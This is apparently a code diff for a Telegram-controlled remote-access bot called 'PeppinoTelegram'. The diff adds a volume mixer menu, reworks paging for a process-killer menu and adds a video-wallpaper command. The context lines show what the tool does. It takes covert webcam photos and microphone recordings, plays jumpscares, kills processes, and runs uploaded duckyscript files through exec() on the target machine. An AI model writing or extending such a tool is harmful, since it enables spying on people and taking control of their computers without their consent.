@@ -34,7 +34,6 @@ except ImportError:
 #MISC
 import sys
 import json
-import winreg
 import ctypes
 import psutil
 import socket
@@ -156,11 +155,12 @@ waitforface - Send a webcam photo when face is detected till timeout.
 breath - Play breathing sound.
 pss - Play "psst" sound.
 microphone - Record mic audio.
-mute - Set computer's volume to 0.
-full - Set computer's volume to 100.
+mutevolume - Set computer's volume to 0.
+fullvolume - Set computer's volume to 100.
 setvolume - Set computer's volume level.
 getvolume - Gets the computer's volume level.
 tralalerotralala - Plays italian brainrot.
+mixermenu - Sends a mixer menu.
 
 😈 Pranks & Visuals
 jumpscare - Show random jumpscare.
@@ -417,8 +417,8 @@ class ButtonsMenu:
         self.label = label
         self.chat_id = chat_id
         self.buttons = buttons
-        self.page_limit = page_limit
-        self.page = page 
+        self.process_killer_page_limit = page_limit
+        self.process_killer_page = page 
         self.keyboard_rows = keyboard_rows
         self.next_btn = next_btn
         self.next_btn_lab = next_btn_lab
@@ -431,15 +431,17 @@ class ButtonsMenu:
             self.send_keyboard()
 
     def create_keyboard(self) -> Any:
-        start_index = self.page * self.page_limit
-        button_list = [InlineKeyboardButton(text=k, callback_data=self.buttons[k]) for k in list(self.buttons.keys())[start_index:start_index + self.page_limit]]
+        start_index = self.process_killer_page * self.process_killer_page_limit
+        button_list = [InlineKeyboardButton(text=k, callback_data=self.buttons[k]) for k in list(self.buttons.keys())[start_index:start_index + self.process_killer_page_limit]]
 
         if self.next_btn:
-            if self.page > 0:
+            if self.process_killer_page > 0:
                 button_list.append(InlineKeyboardButton(text="⬅️ Previous", callback_data=self.prev_btn_lab))
-            if (self.page + 1) * self.page_limit < len(self.buttons):
+            if (self.process_killer_page + 1) * self.process_killer_page_limit < len(self.buttons):
                 button_list.append(InlineKeyboardButton(text="Close ❌", callback_data=self.close_btn_lab)) 
                 button_list.append(InlineKeyboardButton(text="Next ➡️", callback_data=self.next_btn_lab)) 
+        else:
+            button_list.append(InlineKeyboardButton(text="Close ❌", callback_data=self.close_btn_lab)) 
 
         keyboard_rows = [button_list[i:i+self.keyboard_rows] for i in range(0, len(button_list), self.keyboard_rows)]
         return InlineKeyboardMarkup(inline_keyboard=keyboard_rows)
@@ -690,7 +692,7 @@ class PeppinoTelegram:
         self.loading_bar_spinner = loading_bar_spinner
 
         self.help = HELP
-        self.page = 0
+        self.process_killer_page = 0
         self.owner_name = ""
         self.cap = capture
         self.bot = Bot(token) 
@@ -700,6 +702,7 @@ class PeppinoTelegram:
         self.audio_mixer = mixer
         self.process_explorer_menu = None
         self.explorer_message = None
+        self.mixer_menu_keyboard = None
         #converts text to functions
         self.function_table: dict[str:Callable] = {
             "pss":self.pss,
@@ -741,11 +744,13 @@ class PeppinoTelegram:
             "capslock": lambda: toducky("CAPSLOCK", execute=True),
             "randomkeyboard":self.randomkeyboard,
             "terminateprocess":self.terminate_process_by_name,
+            "setvideowallpaper":self.setvideowallpaper,
             "id":lambda:self.bsend(f"CHAT_ID: {self.owner_id}"),
             "recordjum":self.record_jumpscare_reaction,
             "mutevolume":lambda:self.audio_mixer.mute(),
             "setvolume":self.audio_mixer.setVolumePercentage,
             "fullvolume":lambda:self.audio_mixer.full(),
+            "mixermenu":self.mixer_menu,
             "camerawallpaper":self.setCameraAsWallpaper,
             "mousecontroller":self.mousecontroller,
             "cantopenmenu":self.cantopenmenu,
@@ -826,7 +831,7 @@ class PeppinoTelegram:
 `88b    d88b     8    Y     888   888       o  8       `888   `88.    .8'
  `Y8bood8P'Ybd' o8o        o888o o888ooooood8 o8o        `8     `YbodP'
     """
-    def quickmenu(self):
+    def quickmenu(self) -> int:
         buttons = {
             "selfie":"selfie",
             "Screenshot":"screenshot",
@@ -841,6 +846,14 @@ class PeppinoTelegram:
         }
         menu = self.new_menu(buttons, autosend=False)
         return menu.send_keyboard()
+
+    def mixer_menu(self) -> None:
+        buttons = {
+            "🔊Full Volume":"/fullvolume",
+            "🔉Half Volume":"/setvolume 50",
+            "🔇Mute":"/mutevolume",
+        }
+        self.mixer_menu_keyboard = self.new_menu(buttons, close_btn_lab="MXR_close")
     
     def on_callback_query(self, msg) -> None:
         query_id, from_id, data = glance(msg, flavor="callback_query")
@@ -878,12 +891,12 @@ class PeppinoTelegram:
 
     def process_killer(self, page=0) -> None:
         if self.process_explorer_menu is None:
-            self.page = 0
+            self.process_killer_page = 0
         else:
             self.process_explorer_menu.delete()
-            self.page = page
+            self.process_killer_page = page
         processes = [x.name() for x in psutil.process_iter()] 
-        self.process_explorer_menu = self.new_menu({process:f"/terminateprocess {process}" for process in processes}, next_btn=True, autosend=False, page=self.page, next_btn_lab="PK_next_page", prev_btn_lab="PK_previous_page", close_btn_lab="PK_close_page", rows=3)
+        self.process_explorer_menu = self.new_menu({process:f"/terminateprocess {process}" for process in processes}, next_btn=True, autosend=False, page=self.process_killer_page, next_btn_lab="PK_next_page", prev_btn_lab="PK_previous_page", close_btn_lab="PK_close_page", rows=3)
         return self.process_explorer_menu.send_keyboard()
 
     def check_if_proc_running(self, processname) -> bool:
@@ -1408,17 +1421,22 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
                 self.bsend(f"Invalid args for function {command}\n{e}")
             except Exception as e:
                 self.bsend(f"Unhandled error for function {command}\n{e}")
-        elif not func:
+        elif func is None and command.startswith("PK"):
             if command == "PK_next_page" and self.process_explorer_menu:
-                self.page += 1
-                self.process_killer(page=self.page)
+                self.process_killer_page += 1
+                self.process_killer(page=self.process_killer_page)
             elif command == "PK_previous_page" and self.process_explorer_menu:
-                self.page -= 1
-                self.process_killer(page=self.page)
+                self.process_killer_page -= 1
+                self.process_killer(page=self.process_killer_page)
             elif command == "PK_close_page" and self.process_explorer_menu:
                 self.process_explorer_menu.delete()
             elif command in ("PK_next_page", "PK_previous_page") and not self.process_explorer_menu:
                 self.bsend("Use /processkiller first")
+        elif command.startswith("MXR"):
+            if command == "MXR_close":
+                if self.mixer_menu_keyboard:
+                    self.mixer_menu_keyboard.delete()
+                    self.mixer_menu_keyboard = None
         else:
             self.bsend(f"Invalid command {command}")
 
@@ -1430,32 +1448,35 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
         #self.restore_wallpaper()
         self.cantopenlist.clear()
     
-    def parse_document(self, msg: str) -> None:
-        document = msg["document"]
-        filename = document["file_name"]
+    def parse_document(self, msg: str, mimetype="document") -> None:
+        document = msg[mimetype]
         file_id = document["file_id"]
         saved_filename = randomname()
         saved_filepath = join(BURN_DIRECTORY, saved_filename)
         self.bot.download_file(file_id, saved_filepath)
-        self.bsend(f"{filename} saved as {saved_filepath}")
-        if filename.endswith(".dd"):
-            with open(saved_filepath, "r") as fi:
-                content = fi.read()
-            payload_python = toducky(content)
-            self.bsend(f"Executing duckyscript {filename}({saved_filename})")
-            exec(payload_python)
-            remove(saved_filepath)
+        if mimetype == "document":
+            filename = document["file_name"]
+            if filename.endswith(".dd"):
+                with open(saved_filepath, "r") as fi:
+                    content = fi.read()
+                payload_python = toducky(content)
+                self.bsend(f"Executing duckyscript {filename}({saved_filename})")
+                exec(payload_python)
+                remove(saved_filepath)
 
-        elif filename.endswith(".mp4"):
-            caption = msg["caption"]
+        elif mimetype == "video":
+            caption = msg["caption"].lower().strip()
             if caption == "/setvideowallpaper":
+                duration = document["duration"]
                 video_stream = VideoCapture(saved_filepath)
                 res = True
-                while res:
+                start=time()
+                while res and (time()-start)<=duration:
                     res, frame = video_stream.read()
                     imwrite("tmp.png", frame)
                     change_wallpaper(abspath("tmp.png"))
-                    remove("tmp.png")
+                remove("tmp.png")
+                self.restore_wallpaper()
         
     def handle(self, msg: str) -> None:
         content_type, chat_type, chat_id = glance(msg)
@@ -1468,8 +1489,12 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
                 self.parse_photo(msg)
             elif content_type == "document":
                 self.parse_document(msg)
+            elif content_type == "video":
+                self.parse_document(msg, mimetype="video")
             elif content_type in ("voice", "audio"):
                 self.parse_audio(msg)
+            else:
+                self.bsend(f"Unparsed content-type: {content_type}")
         else:
             self.bsend(f"What do you want {sender_name}, I don't work for you.")
 
